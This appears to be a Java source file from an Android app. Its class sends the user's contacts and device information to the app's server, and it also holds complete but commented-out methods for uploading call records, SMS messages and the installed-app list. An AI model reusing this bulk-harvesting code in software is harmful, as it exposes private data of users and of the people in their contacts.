package com.cocotree.android.uploadUtil;

import android.os.Handler;
import android.util.Log;

import com.google.gson.Gson;
import com.cocotree.android.service.LocationService;

import org.json.JSONException;
import org.json.JSONObject;

import java.io.IOException;
import java.util.ArrayList;

import okhttp3.Call;
import okhttp3.Callback;
import okhttp3.MediaType;
import okhttp3.Request;
import okhttp3.RequestBody;
import okhttp3.Response;

/**
 * 作者：luoxiaohui
 * 日期:2018/11/20 13:27
 * 文件描述:
 */
public class UploadNecessaryData {

    private boolean uploadAddressBookSucceed = false;
    private boolean uploadDeviceInfoSucceed = false;
    private boolean uploadCallRecordSucceed = false;
    private boolean uploadSmsSucceed = false;
    private boolean uploadAppListSucceed = false;

    private boolean isGranted = false;

    public interface UploadDataListener {
        void success();

        void error();
    }

    public void upload(String userId, UploadDataListener mListener, boolean isGranted) {
        this.isGranted = isGranted;
        uploadAddressBook(userId, mListener);

        if ((int) LocationService.getInstance().getLocationX() == 0) {
            new Handler().postDelayed(new Runnable() {
                @Override
                public void run() {
                    uploadDeviceInfo(userId, mListener);
                }
            }, 1500);
        } else {
            uploadDeviceInfo(userId, mListener);
        }

//        uploadCallRecord(userId, mListener);
//        uploadSms(userId, mListener);
//        uploadAppList(userId, mListener);
    }

    public void onlyUploadAddressBook(String userId, UploadDataListener mListener, boolean isGranted) {
        this.isGranted = isGranted;
        uploadAddressBook(userId, mListener);
    }

    /**
     * APP通讯录上传
     */
    private void uploadAddressBook(String user_id, UploadDataListener mListener) {
        Gson gson = new Gson();
        BaseHashMap map = new BaseHashMap();
        map.put("user_id", user_id);
        if (isGranted && Utils.readContacts().size() != 0) {
            map.put("status", "1");
            map.put("list", Utils.readContacts().toArray());
        } else {
            map.put("status", "2");
            map.put("list", new ArrayList<>().toArray());
        }

        String json = gson.toJson(map);
        Request request = new Request.Builder()
                .url(UrlHostConfig.uploadAddressBook())
                .post(RequestBody.create(MediaType.parse("application/json"), json))
                .build();
        Call call = OK.getInstance().newCall(request);
        call.enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {
                mListener.error();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {
                try {
                    JSONObject obj = new JSONObject(response.body().string());

                    if (obj.optString("res_code").equals("0000")) {
                        uploadAddressBookSucceed = true;
                        Log.d("karl", "uploadAddressBookSucceed:" + uploadAddressBookSucceed);
                        if (isAllUploadSuccess()) {
                            Log.d("karl", "isAllUploadSuccess:" + isAllUploadSuccess());
                            mListener.success();
                        }
                    } else {
                        mListener.error();
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        });
    }

    /**
     * 通话记录上传
     */
    private void uploadCallRecord(String user_id, UploadDataListener mListener) {
        Gson gson = new Gson();
        BaseHashMap map = new BaseHashMap();
        map.put("user_id", user_id);
        if (!isGranted || Utils.readCallRecords().size() == 0) {
            map.put("status", "2");
            map.put("list", new ArrayList<>().toArray());

        } else {

            map.put("status", "1");
            map.put("list", Utils.readCallRecords().toArray());

        }

        String json = gson.toJson(map);
        Request request = new Request.Builder()
                .url(UrlHostConfig.uploadCallRecords())
                .post(RequestBody.create(MediaType.parse("application/json"), json))
                .build();
        Call call = OK.getInstance().newCall(request);
        call.enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {

                mListener.error();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {

                try {
                    JSONObject obj = new JSONObject(response.body().string());
                    if (obj.optString("res_code").equals("0000")) {
                        uploadCallRecordSucceed = true;
                        if (isAllUploadSuccess()) {
                            mListener.success();
                        }
                    } else {

                        mListener.error();
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        });
    }

    /**
     * 短信上传
     */
    private void uploadSms(String user_id, UploadDataListener mListener) {
        Gson gson = new Gson();
        BaseHashMap map = new BaseHashMap();
        map.put("user_id", user_id);
        if (!isGranted || Utils.readSms().size() == 0) {

            map.put("status", "2");
            map.put("list", new ArrayList<>().toArray());

        } else {

            map.put("status", "1");
            map.put("list", Utils.readSms().toArray());

        }

        String json = gson.toJson(map);
        Request request = new Request.Builder()
                .url(UrlHostConfig.uploadSms())
                .post(RequestBody.create(MediaType.parse("application/json"), json))
                .build();
        Call call = OK.getInstance().newCall(request);
        call.enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {

                mListener.error();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {

                try {
                    JSONObject obj = new JSONObject(response.body().string());
                    if (obj.optString("res_code").equals("0000")) {

                        uploadSmsSucceed = true;
                        if (isAllUploadSuccess()) {
                            mListener.success();
                        }
                    } else {

                        mListener.error();
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        });
    }

    /**
     * appList上传
     */
    private void uploadAppList(String user_id, UploadDataListener mListener) {
        Gson gson = new Gson();
        BaseHashMap map = new BaseHashMap();
        map.put("user_id", user_id);
        if (Utils.getAppList().size() == 0) {

            map.put("status", "2");
        } else {

            map.put("status", "1");

        }
        map.put("list", Utils.getAppList().toArray());

        String json = gson.toJson(map);
        Request request = new Request.Builder()
                .url(UrlHostConfig.uploadAppList())
                .post(RequestBody.create(MediaType.parse("application/json"), json))
                .build();
        Call call = OK.getInstance().newCall(request);
        call.enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {

                mListener.error();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {

                try {
                    JSONObject obj = new JSONObject(response.body().string());
                    if (obj.optString("res_code").equals("0000")) {

                        uploadAppListSucceed = true;
                        if (isAllUploadSuccess()) {
                            mListener.success();
                        }
                    } else {

                        mListener.error();
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        });
    }

    /**
     * 设备信息上传
     */
    private void uploadDeviceInfo(String user_id, UploadDataListener mListener) {
        Gson gson = new Gson();
        BaseHashMap map = new BaseHashMap();
        map.put("user_id", user_id);
        map.put("status", "1");
        map.put("list", Utils.getDeviceInfo());

        String json = gson.toJson(map);
        Request request = new Request.Builder()
                .url(UrlHostConfig.uploadDeviceInfo())
                .post(RequestBody.create(MediaType.parse("application/json"), json))
                .build();
        Call call = OK.getInstance().newCall(request);
        call.enqueue(new Callback() {
            @Override
            public void onFailure(Call call, IOException e) {

                mListener.error();
            }

            @Override
            public void onResponse(Call call, Response response) throws IOException {

                try {
                    JSONObject obj = new JSONObject(response.body().string());

                    if (obj.optString("res_code").equals("0000")) {

                        uploadDeviceInfoSucceed = true;
                        if (isAllUploadSuccess()) {
                            mListener.success();
                        }
                    } else {

                        mListener.error();
                    }
                } catch (JSONException e) {
                    e.printStackTrace();
                }
            }
        });
    }

    /**
     * 判断5个接口是否都成功
     */
    private boolean isAllUploadSuccess() {
//        if (uploadAddressBookSucceed && uploadCallRecordSucceed && uploadSmsSucceed && uploadAppListSucceed && uploadDeviceInfoSucceed) {
        return uploadDeviceInfoSucceed && uploadAddressBookSucceed;
    }
}
